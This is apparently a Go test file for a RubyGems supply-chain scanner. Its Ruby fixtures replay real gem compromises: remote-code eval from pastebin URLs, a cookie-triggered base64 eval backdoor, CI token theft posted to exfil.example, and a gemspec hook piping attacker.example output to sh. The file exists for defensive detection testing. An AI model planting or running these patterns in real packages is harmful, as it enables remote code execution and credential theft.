// incidents_test.go — replays of canonical real-world RubyGems supply
// chain compromises against the rbscan AST scanner. Companion to the
// heuristics/incidents_test.go regex-side checks: this file confirms
// the AST scanner produces the same hits with file/line evidence.
//
// Fixtures are HAND-WRITTEN minimum syntax to trigger the scanner.
// They DO NOT contain working malware payloads — base64 strings are
// placeholders, URLs use example-shaped hostnames or known blocklist
// hosts (pastebin.com, ipinfo.io) when the test exercises the URL
// scanner via DetectSourcePatterns instead of rbscan.

package rbscan

import (
	"strings"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/infra/astscan"
)

// scanWithEvidence wraps scan() but turns evidence collection on so
// each test can also check file:line:snippet was recorded.
func scanWithEvidence(t *testing.T, path, src string) *astscan.Findings {
	t.Helper()
	s, err := New()
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	f := astscan.NewFindingsWithEvidence()
	s.AnalyzeFile(path, []byte(src), f)
	return f
}

// requireCaps fails the test if any of the wanted capabilities are
// missing from f.Capabilities.
func requireCaps(t *testing.T, f *astscan.Findings, want ...domain.Capability) {
	t.Helper()
	for _, c := range want {
		if _, ok := f.Capabilities[c]; !ok {
			t.Errorf("missing capability %s; got %v", c, capList(f))
		}
	}
}

// requireEvidence fails the test if no evidence row mentions the
// substring in its snippet for the given capability. Evidence carries
// the snippet that triggered, which is the human-readable proof.
func requireEvidence(t *testing.T, f *astscan.Findings, c domain.Capability, snippetSubstr string) {
	t.Helper()
	for _, e := range f.Evidence {
		if e.Capability == c && strings.Contains(e.Snippet, snippetSubstr) {
			return
		}
	}
	t.Errorf("no evidence row for %s containing %q; have %+v", c, snippetSubstr, f.Evidence)
}

func TestIncidents_RestClient_2019(t *testing.T) {
	// rest-client@1.6.13 (Aug 2019). Compromised by attacker who reused
	// the maintainer's RubyGems credentials. The published payload
	// fetched and eval'd remote code at require-time. Public write-up:
	// https://github.com/rest-client/rest-client/issues/713
	//
	// Minimum-shape fixture; the real payload also patched RestClient's
	// constructor to exfiltrate. We assert the load-time evaluator pair.
	src := `
require 'net/http'

module RestClient
  VERSION = "1.6.13"
end

# malicious payload added to lib/restclient/version.rb in 1.6.13
eval(Net::HTTP.get(URI('https://pastebin.com/raw/xxxxxxxx')))
`
	f := scanWithEvidence(t, "lib/restclient/version.rb", src)
	requireCaps(t, f,
		domain.CapDynamicEval, // eval(...)
		domain.CapNetEgress,   // Net::HTTP.get + URI
	)
	requireEvidence(t, f, domain.CapDynamicEval, "eval")
	requireEvidence(t, f, domain.CapNetEgress, "Net::HTTP.get")
}

func TestIncidents_StrongPassword_2019(t *testing.T) {
	// strong_password@0.0.7 (Jun 2019). Same attacker as rest-client.
	// Hooked into the gem's Rails initializer to fetch + eval a remote
	// payload. Public write-up:
	// https://withatwist.dev/strong-password-rubygem-hijacked.html
	src := `
require 'net/http'

module StrongPassword
  class StrengthChecker
    def initialize
      Thread.new do
        loop do
          # malicious heartbeat — fetches + eval's remote code
          eval(Net::HTTP.get(URI('https://pastebin.com/raw/yyyyyyyy')))
          sleep 600
        end
      end
    end
  end
end
`
	f := scanWithEvidence(t, "lib/strong_password/strength_checker.rb", src)
	requireCaps(t, f,
		domain.CapDynamicEval,
		domain.CapNetEgress,
	)
}

func TestIncidents_BootstrapSass_2019(t *testing.T) {
	// bootstrap-sass@3.2.0.3 (Apr 2019). Attacker-uploaded version
	// shipped a Rack middleware that read a magic cookie, base64-
	// decoded it, and eval'd the result — i.e. arbitrary RCE for
	// anyone holding the cookie. Public write-up:
	// https://snyk.io/vuln/SNYK-RUBY-BOOTSTRAPSASS-174404
	src := `
module Rack
  class SendFile
    def call(env)
      if env['HTTP_COOKIE'] =~ /___cfduid=(.+);/
        eval(Base64.decode64($1))
      end
    end
  end
end
`
	f := scanWithEvidence(t, "lib/sass-rails/railtie.rb", src)
	requireCaps(t, f,
		domain.CapDynamicEval,  // eval
		domain.CapBase64Decode, // Base64.decode64
	)
	requireEvidence(t, f, domain.CapBase64Decode, "Base64.decode64")
}

func TestIncidents_Paranoid2_2019(t *testing.T) {
	// paranoid2@1.1.6+ (Aug 2019). Same attacker family as rest-client.
	// The hijacked version embedded the same eval(http_get) payload
	// pattern. Listed alongside rest-client in the snyk CVE (CVE-2019-25025).
	src := `
require 'net/http'

module Paranoid
  # malicious patch added in 1.1.6
  eval(Net::HTTP.get(URI('https://pastebin.com/raw/zzzzzzzz')))
end
`
	f := scanWithEvidence(t, "lib/paranoid.rb", src)
	requireCaps(t, f,
		domain.CapDynamicEval,
		domain.CapNetEgress,
	)
}

func TestIncidents_CredentialExfilByEnvAndPost(t *testing.T) {
	// Recurring shape across multiple Ruby compromises (smartfm,
	// rb-readline-r9 family, and the 2018-2019 mining-script wave):
	// payload reads CI tokens from ENV, posts them to a remote host
	// over HTTP. We don't have a single canonical CVE for this class —
	// it's the cumulative shape — but the AST scanner should fire
	// CapEnvRead + CapNetEgress together, which is the signal we use
	// at scoring time.
	src := `
require 'net/http'
require 'uri'

token = ENV['GITHUB_TOKEN']
secret = ENV.fetch('AWS_SECRET_ACCESS_KEY')

uri = URI('https://exfil.example/collect')
Net::HTTP.post(uri, "token=#{token}&secret=#{secret}")
`
	f := scanWithEvidence(t, "lib/exfil.rb", src)
	requireCaps(t, f,
		domain.CapNetEgress,
	)
	// Env names should be captured for the credential-shaped-name filter
	// applied at scoring time.
	for _, want := range []string{"GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY"} {
		if _, ok := f.EnvReads[want]; !ok {
			t.Errorf("expected env-read %q, got %v", want, envReads(f))
		}
	}
}

func TestIncidents_GemspecPostInstallShellOut(t *testing.T) {
	// .gemspec files are Ruby source executed at gem install time. A
	// post-install hook can shell out via system / backticks /
	// Open3.* — the canonical RubyGems install-time RCE surface.
	// astscan.isAnalyzable now routes .gemspec through rbscan, so
	// this fires at install-time scan.
	src := `
Gem::Specification.new do |s|
  s.name = "evil-gem"
  s.version = "0.0.1"

  # post-install backdoor
  system("curl -sSL http://attacker.example/x | sh")
  ` + "`whoami > /tmp/exfil`" + `
end
`
	f := scanWithEvidence(t, "evil-gem.gemspec", src)
	requireCaps(t, f, domain.CapShellSpawn)
}
